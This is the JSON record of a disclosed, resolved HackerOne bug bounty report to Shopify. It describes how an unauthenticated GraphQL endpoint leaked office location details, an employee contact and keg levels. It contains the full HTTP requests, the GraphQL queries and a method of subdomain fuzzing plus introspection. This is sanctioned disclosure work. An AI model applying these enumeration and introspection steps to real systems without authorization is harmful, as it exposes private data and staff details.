{
  "id": 419883,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTk4ODM=",
  "url": "https://hackerone.com/reports/419883",
  "title": "H1514 [beerify.shopifycloud.com] GraphQL discloses internal beer consumption",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "none",
  "readable_substate": "Resolved",
  "created_at": "2018-10-05T23:33:41.819Z",
  "submitted_at": "2018-10-05T23:33:41.819Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "emitrani",
    "url": "/emitrani",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/bbbf913458c48565d99f975f7ab9fc18ad1e989aa4f8811c1209ed725333d1ec"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": true,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-05-08T19:15:14.581Z",
  "bug_reporter_agreed_on_going_public_at": "2019-05-08T19:15:14.483Z",
  "team_member_agreed_on_going_public_at": "2019-05-08T19:11:49.632Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi security team,\n\n**Summary:** With great pleasure we would like to report that we have discovered a GraqhQL endpoint that discloses internal beer consumption at your offices. \n\n**Description:** This endpoint is leaking internal app details about how much beer you have left on any given day.\n\n## Steps To Reproduce:\n\n\n  1) Do a blanket graphql introspection query on shopifycloud domains and download it.\n{F356253}\n  2) Send following query to find out what locations are configured with the app.\n\n```\nPOST /graphql HTTP/1.1\nHost: beerify.shopifycloud.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:62.0) Gecko/20100101 Firefox/62.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-type: application/json\nCookie: _y=36f02e8b-0639-47BB-8F16-B17F7ED46D62; _shopify_y=36f02e8b-0639-47BB-8F16-B17F7ED46D62; _shopify_fs=2018-10-02T22%3A40%3A00.828Z; master_device_id=fc39122b-3f8d-4407-a889-e8090ce47540; _s=3776a811-97F6-43EF-EDB5-757C5727133E; _shopify_s=3776a811-97F6-43EF-EDB5-757C5727133E; _shopify_sa_t=2018-10-03T01%3A12%3A12.231Z; _shopify_sa_p=\nConnection: close\nUpgrade-Insecure-Requests: 1\nX-Forwarded-For: 127.0.0.1, 127.0.01, 127.0.0.1\nX-HackerOne: Shopify\nContent-Length: 69\n\n{\"query\": \"query allLocations{allLocations{address, code, contact}}\"}\n```\n#### Response:\n```\nHTTP/1.1 200 OK\nServer: nginx/1.15.4\nDate: Fri, 05 Oct 2018 23:13:45 GMT\nContent-Type: application/json; charset=utf-8\nConnection: close\nVary: Accept-Encoding\nX-Frame-Options: SAMEORIGIN\nX-XSS-Protection: 1; mode=block\nX-Content-Type-Options: nosniff\nX-Download-Options: noopen\nX-Permitted-Cross-Domain-Policies: none\nReferrer-Policy: strict-origin-when-cross-origin\nX-Cusco-Version: 0.4.10\nETag: W/\"fb29943639fffbdc10edcc9fcc2645bc\"\nCache-Control: max-age=0, private, must-revalidate\nX-Request-Id: 77418b20cbbea262c662e9af85afdfa3\nX-Runtime: 0.013611\nStrict-Transport-Security: max-age=63072000; includeSubDomains; preload\nX-Dc: gke\nX-Dc: gke\nContent-Length: 152\n\n{\"data\":{\"allLocations\":[{\"address\":\"150 Elgin Street, Ottawa, ON, Canada, K2P1L4\",\"code\":\"OTT150, 8th Floor\",\"contact\":\"Alana Plomp (@alana.plomp)\"}]}}\n```\n\n Now with the response we learn the person working there as well as the code which is needed for the next step.\n3) Use the code to pivot into critical information disclosure of beer consumption in the office\n```\n{\"query\": \"query location{location(code:\\\"OTT150, 8th Floor\\\"){taps{edges{node{percentRemaining, beer{brewery, ibu, style, tastingNotes, beerLogo, abv}}}}}}\"}\n```\n#### Response:\n\n```\n{\"data\":{\"location\":{\"taps\":{\"edges\":[{\"node\":{\"percentRemaining\":89,\"beer\":{\"brewery\":\"Beau's Brewing Co\",\"ibu\":30,\"style\":\"American-style Brown Ale\",\"tastingNotes\":\"American Brown Ale pours dark brown with reddish highlights and a tan foam. The aroma features dark notes of cacao and molasses. The flavour is balanced between rich maltiness and hop bitterness. The finish offers clean dark malt with a touch of raisiny fruit.\",\"beerLogo\":\"\",\"abv\":5.6}}},{\"node\":{\"percentRemaining\":2,\"beer\":{\"brewery\":\"Beaus\",\"ibu\":20,\"style\":\"Witbier\",\"tastingNotes\":\"Match made is a slightly hazy Belgian-style witbier that features the pairing of tart, refreshing lime with the exotic spiciness of cumin. Thirst-quenching and food-friendly!\",\"beerLogo\":\"\",\"abv\":5.6}}}]}}}}\n```\n4) Realize this location has a thirst for Witbier and plan your visit accordingly by bringing a 6 pack to the event\n{F356254}\n\n## Impact\n\nThis gives hackers who discover this endpoint an advantage as we know what kinds of beer Shopify employees enjoy and can use this to win them over during the event.\n\nCheers,\nEray & Rojan",
  "bounty_amount": "802.2",
  "formatted_bounty": "$802.20",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 356253,
      "file_name": "image_(3).png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/356/253/1c4a85fe3c016bee2588404baec4c6a1baf38fbf/image_%283%29.png?response-content-disposition=attachment%3B%20filename%3D%22image_%25283%2529.png%22%3B%20filename%2A%3DUTF-8%27%27image_%25283%2529.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTUOKVM5L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T131231Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2Bt0omVOHrZ9OL9Trk%2BdFKhBv%2FQrKC65W11rjrMgC%2F6QIhANia%2FTyBcfeu0XFctw1a%2FJDDLBAa34%2BWU%2F53rhxkz%2BKhKrEFCHUQAxoMMDEzNjE5Mjc0ODQ5IgxUKMbWt1VTh5nJA5MqjgWpIiqILEweaNhgRF6m1s3guYn11lerqJNrnFjeROxUEJywbXRrt%2FcAshROQMcI4IP1FF5kzaP6N8mOGtMrRL%2FiPu4S3YpijdtIekdCS1Sn6Snt4Sh4hrILW%2Bb8ze6H%2F8%2BUjG3tsefJ2i7e6RAZ95Jy%2FsR7Gyo717mGo8tT2xBovHwjfmR5eCTxEwySxWEQvCnkU8sWiVU4TVsVyZojCQaslBXYJlwFTmuq95Ka7nfTvMgKz2HKR%2BHa7dIsA2obOMA1gq914%2BAgrDq45xv0U8MzkvK2tpK9dfMSBVfPWAFHxIt5sREveo4mZ2nlBAm%2BX77TaBAPdROjeHNp2e8Y8GU73sHmCxPEQ6RVEBNo1Cpqin5nayoOUqgSikVBZNppJWCf78ZqDFx6xAksvybCUspLPt8UiXeCwawB4vSOwq1RhpGympS%2F4X%2BAfeB4Och%2Bx%2BOR8nKDDKe3Y%2BeIUIzmLq7R63lPB%2BEoYre1R8%2Bf%2F%2BYGK3IVaxII1oWPg4zPRX6SOnrZtXGjWyAfZ%2F6lNEUsc6rYsPzapeuVSlq%2FRTHQ%2BbWGOkn3wxqxzOCLbZSltQ7LZsPVDrrri2fFwWrFwoheZZCDY0vSRv08hDQ%2Fkq3xDInCDWZMeu%2FK40kiRmv6ehFATji5N1OJbLemuPO%2BTwvrdcBn9fQS4BkDMFIrGhE%2FuOwv61gkyL1fOapjm3KOWa8BmzAuFidAmAy%2BVnosQJMh3ckcvSXiD8sLINTU%2FbSsdV7beCmMpyf6fP3p%2F7VcwiGBABGo294shnTdhd2P0IxsSt7anyRTek2yB5NqzUYBr8WXNft2l3V3HTxgS9tRQXGp0RJdLlzDT1qxWJvF2JoUm4vQH5Pwhirc51bptu0N99Iwn6%2BtrgY6sAElrGju%2FXz82pDWWGfZvz6UL%2Fm95ZWtM25B7Ca5iNmiTQUqK%2BPhqtvh3TLN14mj%2BOXWFTSoPWS4IHLzNFsgx2J0aY83%2FElbkWzC43VwT7caBSFcI5aYu4krRCov2TutbftS11vV1dOme5hlM9%2Bf%2FlUY4xpo4dgVYdlW83DxHU%2BAO74ifhWVTZa4oAIO7OK8ImejZkl87d9LyTXqXHcY75D4o2LMg4shUYHjgRj5VB%2BvcA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3897d03b62a8dd1d1160d63e31a1e6ed0cc037740383d8d436809e7296b3508f",
      "file_size": 323501,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 356254,
      "file_name": "images.jpg",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/356/254/db5fa1802e8661613b398b6d05dba1b41919e045/images.jpg?response-content-disposition=attachment%3B%20filename%3D%22images.jpg%22%3B%20filename%2A%3DUTF-8%27%27images.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTUOKVM5L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T131231Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2Bt0omVOHrZ9OL9Trk%2BdFKhBv%2FQrKC65W11rjrMgC%2F6QIhANia%2FTyBcfeu0XFctw1a%2FJDDLBAa34%2BWU%2F53rhxkz%2BKhKrEFCHUQAxoMMDEzNjE5Mjc0ODQ5IgxUKMbWt1VTh5nJA5MqjgWpIiqILEweaNhgRF6m1s3guYn11lerqJNrnFjeROxUEJywbXRrt%2FcAshROQMcI4IP1FF5kzaP6N8mOGtMrRL%2FiPu4S3YpijdtIekdCS1Sn6Snt4Sh4hrILW%2Bb8ze6H%2F8%2BUjG3tsefJ2i7e6RAZ95Jy%2FsR7Gyo717mGo8tT2xBovHwjfmR5eCTxEwySxWEQvCnkU8sWiVU4TVsVyZojCQaslBXYJlwFTmuq95Ka7nfTvMgKz2HKR%2BHa7dIsA2obOMA1gq914%2BAgrDq45xv0U8MzkvK2tpK9dfMSBVfPWAFHxIt5sREveo4mZ2nlBAm%2BX77TaBAPdROjeHNp2e8Y8GU73sHmCxPEQ6RVEBNo1Cpqin5nayoOUqgSikVBZNppJWCf78ZqDFx6xAksvybCUspLPt8UiXeCwawB4vSOwq1RhpGympS%2F4X%2BAfeB4Och%2Bx%2BOR8nKDDKe3Y%2BeIUIzmLq7R63lPB%2BEoYre1R8%2Bf%2F%2BYGK3IVaxII1oWPg4zPRX6SOnrZtXGjWyAfZ%2F6lNEUsc6rYsPzapeuVSlq%2FRTHQ%2BbWGOkn3wxqxzOCLbZSltQ7LZsPVDrrri2fFwWrFwoheZZCDY0vSRv08hDQ%2Fkq3xDInCDWZMeu%2FK40kiRmv6ehFATji5N1OJbLemuPO%2BTwvrdcBn9fQS4BkDMFIrGhE%2FuOwv61gkyL1fOapjm3KOWa8BmzAuFidAmAy%2BVnosQJMh3ckcvSXiD8sLINTU%2FbSsdV7beCmMpyf6fP3p%2F7VcwiGBABGo294shnTdhd2P0IxsSt7anyRTek2yB5NqzUYBr8WXNft2l3V3HTxgS9tRQXGp0RJdLlzDT1qxWJvF2JoUm4vQH5Pwhirc51bptu0N99Iwn6%2BtrgY6sAElrGju%2FXz82pDWWGfZvz6UL%2Fm95ZWtM25B7Ca5iNmiTQUqK%2BPhqtvh3TLN14mj%2BOXWFTSoPWS4IHLzNFsgx2J0aY83%2FElbkWzC43VwT7caBSFcI5aYu4krRCov2TutbftS11vV1dOme5hlM9%2Bf%2FlUY4xpo4dgVYdlW83DxHU%2BAO74ifhWVTZa4oAIO7OK8ImejZkl87d9LyTXqXHcY75D4o2LMg4shUYHjgRj5VB%2BvcA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=734164f96324d48819187ed7aade2596a28ef014f2abe8ebe8b2e8caa218bfed",
      "file_size": 7797,
      "type": "image/jpeg",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 54,
  "voters": [
    "ermilov",
    "pajoda",
    "drsniper",
    "kapytein",
    "base_64",
    "fisher",
    "0xacb",
    "bugbountier",
    "ali",
    "dhakal_ananda",
    "and 44 more..."
  ],
  "severity": {
    "rating": "none",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 10803,
    "asset_type": "OTHER",
    "asset_identifier": "Other",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 15869,
      "category": "team",
      "content": "*Note: This report was submitted during our H1-514 live hacking event, which had an expanded scope compared to our public bug bounty program. The app mentioned in this report is not currently in scope for our public program.*",
      "user": {
        "id": 175526,
        "username": "shopify-peteryaworski",
        "name": "Peter Yaworski",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2017-06-13T14:40:59.020Z",
        "url": "https://hackerone.com/shopify-peteryaworski",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "id": 11135,
      "category": "researcher",
      "content": "I want to quickly talk about how this report came to be and me an Rojan ended up working together on it so it might help people reading it. \n\nWhen scope was announced first thing I did was read the public reports on the main program. @rijalrojan's #397130 peaked my interest. I figured if there was one endpoint in `*.shopifycloud.com` that interacted with `/graphql` before an Okta authentication there had to be others too. \n\nI collected all the subdomains for `*.shopifycloud.com` I could. Then I sent a random query to `/graphql` endpoint to all of them using `wfuzz`. This netted me around 10 endpoints by just filtering for 200 responses. From there I sent introspection queries to all of them in Burp Repeater but I was getting `query string not present` error. That's when I contacted @rijalrojan since his report was what lead me down this road. He told me to add the proper `content-type:` header to the post request to get it to work which let us download all the schemas. \n\nOnly interesting domain that actually lead to private data was this one. We decided to frame the report in a fun way which ended up working out for us. Main takeaway is look at public reports and try to find the root flaw or generalize the issue and apply it elsewhere. \n\nHopefully this was helpful to people reading it.",
      "user": {
        "id": 206181,
        "username": "emitrani",
        "name": "Eray Mitrani",
        "bio": "Just stumbling into crits🍀 @ErayMitrani",
        "cleared": true,
        "verified": true,
        "website": null,
        "location": "New York",
        "created_at": "2017-10-07T01:13:32.261Z",
        "url": "https://hackerone.com/emitrani",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/bbbf913458c48565d99f975f7ab9fc18ad1e989aa4f8811c1209ed725333d1ec",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/3bab17d5c599dd892d16ec2294c90d31fffec4c913d2a2d1eee99f1b66443b4c",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/90619f7826123741ae24fb6c75c2841a469dfc9a1000bcf24480d26f30bd0f60"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
